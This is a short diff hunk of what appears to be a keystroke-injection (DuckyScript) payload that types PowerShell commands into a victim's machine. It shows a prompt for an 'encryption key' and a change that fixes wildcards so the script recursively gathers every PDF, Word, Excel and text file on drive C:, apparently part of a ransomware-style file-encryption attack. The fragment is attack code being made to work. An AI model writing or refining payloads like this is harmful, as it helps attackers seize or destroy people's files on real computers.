@@ -9,7 +9,7 @@ STRING $key=Read-Host -Prompt "encryption key"
 DELAY 500
 ENTER
 DELAY 500
-STRING $files=Get-ChildItem -Path C:\ -Recurse -Include .pdf,.docx,.xlsx,.txt
+STRING $files=Get-ChildItem -Path C:\ -Recurse -Include *.pdf,*.docx,*.xlsx,*.txt
 DELAY 500
 ENTER
 DELAY 500
